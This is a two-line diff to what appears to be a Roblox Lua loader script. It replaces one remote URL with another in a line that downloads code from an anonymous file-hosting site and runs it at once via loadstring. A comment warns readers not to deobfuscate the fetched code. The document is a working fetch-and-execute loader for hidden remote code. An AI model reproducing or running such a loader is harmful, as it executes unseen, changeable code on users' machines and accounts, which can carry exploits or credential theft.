@@ -1,2 +1,2 @@
 -- don't try to deobfuscating
-loadstring(game:HttpGet("https://files.catbox.moe/zfilww.txt"))()
+loadstring(game:HttpGet("https://files.catbox.moe/568y2f.txt"))()
